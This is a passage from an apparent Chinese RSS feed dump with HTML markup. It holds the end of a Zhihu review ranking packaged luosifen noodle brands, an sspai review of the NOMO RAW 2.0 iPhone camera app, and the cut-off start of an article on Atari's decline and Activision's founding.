src=\"https://pic4.zhimg.com/v2-7b246ba524b97bb32bbe0c68d201206f_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"713\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7b246ba524b97bb32bbe0c68d201206f\" data-watermark-src=\"v2-9650db8e8bdaf87eef88ca7b131e301d\" data-private-watermark-src=\"v2-b0cde9e7784681a74ee4838bf961d146\"></p>\n<p>口味比较温和，但味道真的不错。汤底调味层次丰富而平和，闻起也很香，是让大家都愿意喝汤的一碗螺蛳粉。酸笋好评！臭中带有一丝香甜，好好吃！配菜也很新鲜。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429831454843432960\"></a><p><b>5.螺状元</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-fe861e6645df27f61fefe566e888cb94_720w.jpg?rss\" data-rawwidth=\"1269\" data-rawheight=\"846\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-fe861e6645df27f61fefe566e888cb94\" data-watermark-src=\"v2-42227a2db91a8a73725ebe05de70671a\" data-private-watermark-src=\"v2-07fd54b19ff3d8f7e4f63f69e166a190\"></p>\n<p>有一位评委吃了几口，就猜出了品牌，因为这是她家里长期的囤货，很熟悉。闻起来有一股特别香的油味，让人忍不住喝汤。汤的层次也非常丰富，鲜甜酸平衡。粉口感特别好，Q弹香滑。配菜多而优质。酸豆角和酸笋都是香香脆脆的很好吃，腐竹和花生也都很新鲜，香香脆脆的。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429831864769523712\"></a><p><b>6.马中才</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f6588a2efca1782b2433735708658891_720w.jpg?rss\" data-rawwidth=\"1269\" data-rawheight=\"846\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f6588a2efca1782b2433735708658891\" data-watermark-src=\"v2-c8e5194c116b35b4b665592fa07e80a6\" data-private-watermark-src=\"v2-c681d32e03698de4ae4be8f177b1274f\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f4f017c69b92a9f01da85fc0052288e4_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"713\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f4f017c69b92a9f01da85fc0052288e4\" data-watermark-src=\"v2-9e0f7d3abc0d5989158a2f030e6faf50\" data-private-watermark-src=\"v2-6891c7a0d9480c6e007df047d9cefca8\"></p>\n<p>唯独一碗有超大螺肉的螺蛳粉，引来的评委团的惊呼和争抢。腐竹也是比较特别的大片，泡在汤里超级诱人，一口吃下去也够味。汤底是咸鲜口，整体不错。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429832228671492096\"></a><p><b>7、凤张螺蛳粉</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-3e2563b769c9ea149b3c62d970d41ded_720w.jpg?rss\" data-rawwidth=\"1269\" data-rawheight=\"846\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3e2563b769c9ea149b3c62d970d41ded\" data-watermark-src=\"v2-ae568098438b0ddc1b6f070e60b6e49b\" data-private-watermark-src=\"v2-de8d43994890ddd951521e00c0f886b2\"></p>\n<p>一端上来就被惊呼“好香！”仔细一看是因为有<b>【油葱】</b>，油葱的香味和螺蛳粉的“臭”超级搭配，加分！柳州当地很多家老牌螺蛳粉都有加，不知道为什么包装螺蛳粉大多数都没有。建议都向这一家学习！加油葱！！！</p>\n<p><b>8.好欢螺原味</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-55e8e8eefcbebae05705b50b467d8961_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-55e8e8eefcbebae05705b50b467d8961\" data-watermark-src=\"v2-f44ec87776838bd53be4f11bffee0ed2\" data-private-watermark-src=\"v2-8662b9e8ce905b83d1d418c2265b3106\"></p>\n<p>汤底咸、甜、鲜，整体味道搭配得非常和谐，汤底里小小的螺肉是个惊喜，瞬间被大家抢光。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429833891989913601\"></a><p><b>9.螺霸王麻辣味</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0b9b3927f7296f53c01d09cd22427eaf_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0b9b3927f7296f53c01d09cd22427eaf\" data-watermark-src=\"v2-a90a19476d55339dd5d0eb75cb48bdb8\" data-private-watermark-src=\"v2-7dc8fb6d0e41967dea83d9f2695b6168\"></p>\n<p>非常适合重口味深度螺蛳粉爱好者！汤底咸鲜酸辣非常够味！酸笋够酸够臭，喜欢螺蛳粉的人会觉得是香香的，配菜很丰富，除了腐竹，还特别加了【蛋白条】，有点像我们平时吃的豆棍，在汤里泡一泡再吃，会超级入味。螺蛳粉爱好者必入。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429834453123891200\"></a><p>10.螺霸王原味</p>\n<p><img src=\"https://pic4.zhimg.com/v2-39733dd05207bf6ccc227703f2000b2c_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-39733dd05207bf6ccc227703f2000b2c\" data-watermark-src=\"v2-df57fb046f770fb36a6659c445571391\" data-private-watermark-src=\"v2-093b1f4053959c848848128ac5183624\"></p>\n<p>粉入口感觉超棒，Q弹又细滑，汤底鲜香，所有配菜的品质都很高，花生腐竹新鲜又香脆，酸笋甜脆甜脆的，很好吃。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429834939974381568\"></a><p>11.李子柒原味</p>\n<p><img src=\"https://pic4.zhimg.com/v2-beff32e6971e0746e1881d2c65af30c6_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-beff32e6971e0746e1881d2c65af30c6\" data-watermark-src=\"v2-465255645311aec446c44bc40de60c61\" data-private-watermark-src=\"v2-a365d4c67c507cb3dff5be49a7d22d68\"></p>\n<p>汤底层次丰富，非常鲜，并且不会过咸。配菜丰富，该有的都有，腐竹超级多！这点特别赞！并且花生也很香脆。有两位重口味评委不太满意，但综合而言，这是一款品控相当优秀，并且适合大众口味的螺蛳粉。</p>\n<p>在网上看到过很多说李子柒难吃的文章，个人觉得蛮奇怪的。身边本来就有很多朋友爱吃，这次我们盲吃，也把它给选出来了。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429835811169136640\"></a><p><b>12.拾光悠味</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-8c2650b277705da43405e6c896070591_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8c2650b277705da43405e6c896070591\" data-watermark-src=\"v2-b119c24b95697b9dfcc6b5d7afe0e134\" data-private-watermark-src=\"v2-1698edf5eed22208cd1fe99fdf2d515f\"></p>\n<p>算是一款脱颖而出的不知名品牌。汤底喝起来回味满满，咸鲜香平衡得恰到好处。配菜整体新鲜度都很棒，花生香香脆脆、腐竹饱满入味，酸笋有一点点过酸，不过总体评分也算是很优秀了！</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429836382793125889\"></a><p><b>13.小新有炸</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c81fc2a49fbc20546c0742d85fb5c55f_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-c81fc2a49fbc20546c0742d85fb5c55f\" data-watermark-src=\"v2-8328bfafaa4efe8154606842cb7015aa\" data-private-watermark-src=\"v2-39377e786c170f432821b0bf1230288e\"></p>\n<p>这个牌子的配菜很丰富，酸笋嚼起来很过瘾，嘎嘣脆。汤底也浓厚有回味，香香辣辣，微甜。并且里面还有口感有韧劲的螺蛳，就更加分。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429836746419306496\"></a><p><b>14.锅圈食汇</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ae7013f3ea5b1614852ec1cb5e2df23c_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ae7013f3ea5b1614852ec1cb5e2df23c\" data-watermark-src=\"v2-7f2281f320c84aa637056733718337f4\" data-private-watermark-src=\"v2-44f2635a0eae35e7bf9e1f1859dc3314\"></p>\n<p>汤底多了一层特别的焦香味，所有评委都注意到了这一点，有人说像像糊辣椒的香，有人说像胡椒的香，总之香味很特别也很抢戏。味道层次丰富、偏酸偏甜。是比较特别的一款螺蛳粉，值得一试。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429837172879257600\"></a><p>15.吉吉咔</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c9bd96324ccc0e784fd09686f9664e17_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-c9bd96324ccc0e784fd09686f9664e17\" data-watermark-src=\"v2-0f4c32a9b2301a70d11fd26797da6604\" data-private-watermark-src=\"v2-5a3cd454b4640b60f5c4959240fad7ec\"></p>\n<p>除了螺蛳粉特有的香味，还多了一层川味火锅的香，汤底的层次很和谐，评委们纷纷表示非常过瘾。粉稍微偏细，但也还算Q弹。价格也很实惠。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429837619551756288\"></a><p><b>接下来就是残忍的【拉黑避雷榜】，几乎都是毫无可吃性，很奇怪为什么会有一些网红品牌也在其中。但没办法，这里必须展示出评委们的主观感受：</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-24f8d8b224293d3749f4010b2d332596_720w.jpg?rss\" data-rawwidth=\"3675\" data-rawheight=\"2882\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-24f8d8b224293d3749f4010b2d332596\" data-watermark-src=\"v2-e4496be176fd7daf9782166c1e4f3705\" data-private-watermark-src=\"v2-a3c6df6512c81a217a5f0229564e862a\"></p>\n<p><b>【可以试一试榜单】中的品牌和味道，虽然并不最出色，但整体尚可。</b></p>\n<p><b>其中一些品牌也各有亮点，大家可以根据自己的喜好，选择尝试：</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0043e7ad2742d677799ab7f0cc2d5c06_720w.jpg?rss\" data-rawwidth=\"3675\" data-rawheight=\"2434\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0043e7ad2742d677799ab7f0cc2d5c06\" data-watermark-src=\"v2-110e1c8559d08b3c1924712f9d05a78e\" data-private-watermark-src=\"v2-3c2038841e7aff9d4ce4f7ef34d74d5d\"></p>\n<h2>分享花式吃法：</h2>\n<p>回家之后，我捯饬了好几顿，研究出了一包螺蛳粉打开新世界的N种DIY吃法！还召集嗦粉爱好者们开了个螺蛳粉party，朋友们赞叹连连，亲测好吃，分享给大家，建议收藏！！</p>\n<p><b>最具本地风味版：加溏心荷包蛋、空心菜、油葱</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ff5599ecd7762513f9bce8bac3b4a235_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"845\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ff5599ecd7762513f9bce8bac3b4a235\" data-watermark-src=\"v2-421719c43b657e683018f7b8379a46e9\" data-private-watermark-src=\"v2-478d21dd85584222bc36411397b6374c\"></p>\n<p>当地店里的螺蛳粉，加上一个溏心荷包蛋，荷包蛋混合螺蛳粉汤汁的香味，真的超！！级！！绝！！</p>\n<p>强烈推荐一试！油葱自己在家炸就行，小火用油把小葱炸焦就好，是个大大的加分项，空心菜又是必不可少，加上这三种料，就可以说是一碗非常具有本地风味的螺蛳粉了。</p>\n<p><b>敲豪华DIY版：金针菇、午餐肉、牛肉卷</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-21304aea8834d712326a498f39777bcd_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"845\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-21304aea8834d712326a498f39777bcd\" data-watermark-src=\"v2-5aeefcf71f7bdeaa96e3192d8047548c\" data-private-watermark-src=\"v2-676f0545e2d8012e56e87edc2fcf5210\"></p>\n<p>试过很多种配菜，这几种加进去最有幸福感，因为午餐肉和牛肉卷，都是特别入味的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-92f61721470c0744ff7f8f37b8040a00_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"845\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-92f61721470c0744ff7f8f37b8040a00\" data-watermark-src=\"v2-39ed9f020836455e0b95367b408d448a\" data-private-watermark-src=\"v2-9a1e8a467ba266c0c9d422b95fc38959\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-adad3cfc0c556a2561e93e0401858d7c_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"845\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-adad3cfc0c556a2561e93e0401858d7c\" data-watermark-src=\"v2-02e1ba057d4bee0a96d376a72228ba85\" data-private-watermark-src=\"v2-948d670d2022ab354dc1a21434034d2b\"></p>\n<h3>写在最后：</h3>\n<p>煮了一百多碗粉，又去了趟柳州。简直打开了螺蛳粉的新世界！本以为会吃到想吐，吃完所之后会对螺蛳粉再也爱不起来，谁知道却因为它极具碰撞的味觉层次，而入坑更深了！！</p>\n<p>正宗螺蛳粉的汤底<b>，以猪骨和螺蛳熬制出的浓郁汤头，又有八角、桂皮、丁香、辣椒诸多香料的烘托，显得回味无穷。出锅之后还要浇上一大勺白醋和红彤彤的辣椒油。酸笋、黑木耳、酸豆角的爽脆，搭配米粉Q弹又绵软的口感，再来一口腐竹吸满汤汁的麻辣清香。这种</b>极具生命力的味觉碰撞，让人久吃不腻。</p>\n<p>我想螺蛳粉能被大多数人喜爱，成为<b>【粉届顶流】</b>，既是偶然，也是必然吧！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/pi-pi-de-dan-dan-66?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Bonnie的小皮皮</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/38206053/answer/2160266807?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">595 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/320471653?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">淘宝上的螺蛳粉好吃，求推荐哇？</a><br><a href=\"http://www.zhihu.com/question/437881424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">淘宝上的螺蛳粉哪家的好吃？</a><br>\n","link":"http://www.zhihu.com/question/38206053/answer/2160266807?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"在 iPhone 上还原相机体验，让「拍好照片」变得更简单：NOMO RAW 2.0","date":"2021-10-08 07:30:00","description":"\n<p>借着 iPhone 13 Pro 系列和 iOS 15 正式发布的东风，NOMO RAW 在近日也更新了 2.0 大版本，新版主要是新增了一个 ProRAW 编辑器，这也就意味着我可以像使用相机一样来使用 NOMO RAW，在拍照的时候只需要专注于「构图」，后期的所有事情都可以在拍摄结束后再一一调整。</p>\n<p>如果你和我一样是一名手机摄影爱好者，并且恰好你使用的手机是 iPhone 12 Pro 系列或者 iPhone 13 Pro 系列，那么你一定要尝试一下 NOMO RAW，因为它赋予了 iPhone 摄影更加强大的功能，不管是日常记录还是专业拍摄，都能获得绝佳的创作体验。</p>\n<h2>先拍后调，不错过每一个精彩的瞬间</h2>\n<p>借助于 Apple ProRAW 格式，NOMO RAW 在相机界面的左上角打开 RAW 开关后，有充分的后期空间对拍好的照片进行调整。2.0 版本新增的这个 ProRaw 编辑器，采用了 16-bit 的全流程色彩管线，极大程度地降低了在各个环节中色彩失真或丢失的问题，可以对照片从画幅比例、色彩方案、曝光（RAW）、色温（RAW）、色调（RAW）、锐化（RAW）、阴影（RAW）、高光、对比度、饱和度、胶片颗粒、暗角等多达 11 项进行调整。</p>\n<p>根据 <a href=\"https://m.weibo.cn/status/4687547404387730\" target=\"_blank\">飞猪老师的介绍</a>，其中有 5 项标注了是专门针对 RAW 格式的照片来进行的，比如说曝光调整，就是按照标准的 EV 标定，对 ProRAW 文件进行重新解析，也就是说在不超过动态范围的情况下，它和我在拍摄时调整曝光的结果，是没有区别的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/2ee9ca3fd152a79ddd493c18b3e7f578.JPEG\"></figure><p>在「编辑图片」界面的右下角，可以看到一个放大镜一样的图标，这其实是一个「放大镜」辅助工具，灵感来自胶片摄影中的「观片器」，可以对照片从 200% 到 1:1 进行放大，方便我在观察照片细节的同时也可以兼顾整张照片的观感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/7dd6042c79fdb7d53d181d98be0fee05.JPEG\"></figure><p>得益于强大的 ProRAW 编辑器，我使用 NOMO RAW 拍照的流程就发生了变化，我只需要打开 App、选好焦距、调整身位、找好角度，然后按下快门即可，等所有拍摄完成后，再坐下来对照片进行精细的调整。</p>\n<h2>色彩管理，让手机也能拍出胶片质感</h2>\n<p>在 ProRAW 编辑器中有一项针对 RAW 格式照片的锐化选项，NOMO RAW 基于 ProRAW 原始信息保存的大量信息，将细节信号、局部反差、明度噪声、边缘反差等数据，全部重新处理过之后，可以呈现出来在视觉上更加「锐利」的图片效果。</p>\n<p>通过前面提到的「放大镜」辅助工具，我们可以在下面两张相同的照片中看出明显的区别，其中左侧是去掉了所有机内锐化的效果，右侧是将锐化拉到 20，从右侧的照片中可以看到细节更加丰富的绒毛。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/3580c7aa6e32722001148eadfa436a6b.JPEG\"><figcaption>建议点开大图观看</figcaption></figure><p>NOMO RAW 这个「RAW 锐化」功能不是空穴来风，而是为了服务于自己的胶片色彩方案。用过 NOMO CAM 的朋友一定知道这个产品中已经呈现出了非常多胶片模拟的色彩风格，现在这些色彩风格又重新来到了 NOMO RAW 上。</p>\n<p>不过，与 <a href=\"https://sspai.com/app/NOMO%20CAM\" target=\"_blank\">NOMO CAM</a> 中浓墨重彩的胶片模拟不同，在 NOMO RAW 中的胶片模拟，更「淡雅」一些，表现了比较「专业向」的胶片扫描质感。当我把「RAW 锐化」拉到 20 时，照片的整体效果就会非常像扫描胶片时候，扫描仪机内的「锐化」质感。</p>\n<p>这次 NOMO RAW 在 2.0 版本新增了 9 款不同的色彩方案，包括了：</p>\n<ul>\n<li>f1: Fujicolor Pro 160C</li>\n<li>f3: F-CP TYPE3510</li>\n<li>f4: Fujicolor Superia 400</li>\n<li>k1: Kodak Portra 160</li>\n<li>k2: KODAK VISION 2382</li>\n<li>k4: Kodak Portra 400</li>\n<li>a1: Agfa Portrait 160</li>\n<li>a4: AgfaPhoto Vista 400</li>\n<li>x4: Kodak Tri-X 400</li>\n</ul>\n<p>其中，我最喜欢的要数 f1: Fujicolor Pro 160C、f3: F-CP TYPE3510 和 k4: Kodak Portra 400，它们在拍摄建筑、风光和食物时可以展现出非常棒的质感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/c531dc5b5198e2deb5d2103b78f6d61b.JPEG\"></figure><h2>版本管理，和选择恐惧症说再见</h2>\n<p>「版本管理」是另外一个非常实用的功能，可以帮助像我这样对色彩没有直觉天赋的人解决选择困难的问题。在 NOMO RAW 中，不管是针对画幅比例、色彩方案还是参数的调整，都可以记录为一个单独的版本或者覆盖原有的版本。</p>\n<p>每次拍完一张照片，NOMO RAW 都会在版本记录中自动生成一个 RAW 版本和一个附带色彩方案的版本，这时候在系统相册里只能看到一张照片。</p>\n<p>这个时候，如果我修改 RAW 版本，那么无法选择「更新图片」，只能选择「保存副本」，这样一来版本记录里就会多一个新的版本，系统相册里也会多一张新的照片；如果我修改附带色彩方案的版本，那么我选择「更新图片」后就会覆盖掉原来的版本，同时系统相册里的那种照片也会被覆盖，如果我选择「保存副本」，那么和前面一样，版本记录里就会多一个新的版本，系统相册里也会多一张新的照片。听起来可能有点绕口，但认真理一下就会发现这是符合逻辑的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/284faab6169f79a65649bf7415510bf1.JPEG\"></figure><p>在实际使用的过程中，我会针对同一张照片做好不同风格的调整，然后在「版本管理」中保存为不同的副本，初步筛选时先删掉不需要的版本，然后再经过比对筛选出自己最喜欢的那张照片，通过星标功能设为封面，这样在 NOMO RAW 和系统相册中我都可以直接看到喜欢的那个版本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/2cbb0962fa7ea22f8b5cd75c11e4aab9.JPEG\"></figure><h2>后记</h2>\n<p>手机摄影何时能取代相机？这个话题由来已久，但我不想再这里讨论。我只感受到随着手机硬件和摄影软件的提升，比如说 iPhone 13 Pro 系列和 NOMO RAW，确实给我们用镜头去记录生活提供了一种更加方便和灵活的方式，这也正是我心中手机摄影最正确的打开方式，它不需要做到「最好」，只需要「够好」。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/nomo-raw-%E4%B8%93%E4%B8%9A-proraw-%E7%9B%B8%E6%9C%BA/id1572429540\" target=\"_blank\">App Store</a> 下载 NOMO RAW，年订阅价格 98 元，NOMO CAM 订阅用户可以免费获取 NOMO RAW。</p>\n<span class=\"ss-application\" app-id=\"16098\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69124"},{"title":"雅达利是怎么把自己「折腾至死」的？","date":"2021-10-08 06:33:44","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>20 世纪 80 年代是一个全世界都在「折腾」的年代，方兴未艾的游戏业界也不例外。80 年代初，债台高筑的任天堂折腾出了 Game &amp; Watch 和 FC 红白机，不但一举扭转颓势，并且开始大举进军家用游戏机行业，夸下了「两年卖出三百万台」的海口 —— 尽管全日本当年的家用游戏机总销量都还没达到这个数字。虽然山内溥的发言在任天堂社内也被当成疯话，但是相对于大洋彼岸的游戏机巨头雅达利来说，这种「折腾」的「格局」显然还是小了点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0ilb34teh5fkveag.jpeg\"><figcaption>Atari 2600 的装机量庞大到每三个美国家庭就拥有一台该型游戏机。</figcaption></figure><h2>「旧日支配者」的「格局」有多大？</h2>\n<p>作为二十世纪七八十年代游戏业界的绝对统治者，雅达利从街机起家，后凭借着 Atari 2600 成功闯入并迅速占领了北美大陆的家用游戏机市场 （<s>依靠自家街机业务输血熬死了其他竞争对手 </s> ），公司市值从 3000 万美元一度膨胀至 32 亿美元，好不风光。</p>\n<p>起初，雅达利主要依靠移植自家的街机游戏来扩张游戏阵容，然而可移植的游戏数量毕竟有限，很快雅达利就开始组建一支专为 Atari 2600 制作游戏的开发团队。看起来，雅达利似乎已经站在了游戏业界的「风口」，拿到了软件行业的第一手「头部资源」，以游戏开发为「抓手」，以自家的街机移植作品为「护城河」，建立起了自家产品的「生态闭环」，实施了对友商产品的「降维打击」，重新制定了家用游戏机的「行业打法」，在游戏开发到发行的过程中实现了「端到端的短、平、快式处理」，进入了某种良性循环。<s> 当代互联网大厂直呼内行 。</s></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0itb34teit0pmrlg.png\"><figcaption>雅达利为 Atari 2600 平台推出的游戏数量繁多，这其中也包括少数以买断形式发售的第三方游戏。</figcaption></figure><p>互联网黑话说多了早晚要倒霉的，而雅达利的所作所为可比这些所谓的「黑话」还要黑得多。得益于自身的强大财力和无与伦比的市场号召力，Atari 2600 的游戏开发进程相当顺风顺水 —— 当然，这只是对雅达利而言。在突飞猛进的业绩之下，是雅达利对软件开发部门近乎「残忍」的层层盘剥。</p>\n<h3>「臭写代码的，上雅达利要饭来了？」</h3>\n<p>1980 年，雅达利的创始人诺兰·布什内尔（Nolan Bushnell）已经离开，时任雅达利 CEO 的是从母公司时代华纳空降而来的雷蒙·凯撒（Raymond Kassar），作为一个老美利坚、正星条旗的职业经理人，凯撒是一个不折不扣的实业家，却不是一个懂得和尊重技术的人。众所周知，「DC 最大的敌人是华纳」，而这句话套用到雅达利身上也同样合适。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0j5b34teh3cl8md0.jpeg\"><figcaption>雅达利的崩溃与雷蒙·凯撒唯利是图的商业策略脱不了干系。</figcaption></figure><p>为了保证雅达利在游戏软件上的数量优势和内容独占，凯撒对软件开发部门的压榨不能说是毫无人性，至少也可以说是惨绝人寰。凯撒自打内心深处就瞧不起这些为雅达利呕心沥血的开发人员，认为他们只是一群会敲打键盘的嬉皮士。他要求开发人员夜以继日地工作，连最基本的休息时间都被压缩到最低限度，而开发者却不能从自己制作的游戏中获得半点好处，甚至都不能在包装上拥有自己的姓名。在精神和肉体的双重摧残下，越来越多的开发者表现出了自己的不满。</p>\n<h3>「那我走？」</h3>\n<p>从雅达利出走的「嬉皮士」中不乏极具冒险精神和创新思维的人。在离职的愤怒和沮丧之后，大卫·克雷恩（David Crane）、拉里·卡普兰（Larry Kaplan）、阿兰·米勒（Alan Miller）和鲍勃·怀特海德（Bob Whitehead）这四位雅达利的前工具人迅速达成了共识，他们的对话可以被浓缩成以下内容：</p>\n<blockquote>\n<p><i>「靠我们自己，能不能挣钱？」</i></p>\n<p><i>「能挣，家里。」</i></p>\n<p><i>「靠开发游戏，能不能挣钱？」</i></p>\n<p><i>「能挣，跪着。」</i></p>\n<p><i>「我们自己开发游戏，能不能站着把钱给挣了？」</i></p>\n</blockquote>\n<p>于是，几位快被雅达利薅秃了的程序员把心一横，决定反过来狠狠薅雅达利一把羊毛。就这样，今天为人所熟知的动视（Activision）在 1979 年正式成立。<strong>作为史上首个第三方游戏发行商，动视打破了「硬件制造商包办软件发行」的行业规则</strong>，于雅达利之外独立发行自己开发的 Atari 2600 游戏，借机瓜分雅达利的软件利润。动视开发的游戏本身素质过硬，加之蹭到了雅达利垄断之下的庞大市场，动视在成立后的不久就赚的盆满钵满，这很快引起了「老东家」的关注。</p>\n<h2>「旧日支配者」的「气度」有多小？</h2>\n<p>早在 1980 年 1 月的 CES 展会之后，雷蒙·凯撒就写信警告过动视不要打雅达利的主意，然而此时的动视早已通过逆向破解的方式制造出了自己的 Atari 2600 开发机，并开始着手建立销售网络；3 月份，动视公开了他们开发的四款首发游戏，明摆着就是要和雅达利死磕到底。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/01/ce61c05b69d51df1a2273971a4f110c1.png\"><figcaption>《Pitfal!》是由动视开发和发行的首款游戏，也是 Atari 2600 平台上最畅销的作品之一。</figcaption></figure><p>1980 年 5 月，怒不可遏的雅达利用一纸诉状将动视告上了法庭。雅达利认为动视的做法破坏了自己的游戏开发、发行与销售业务，对自己的合法权益造成了严重损害，并在法庭上一再强调动视逆向破解 Atari 2600 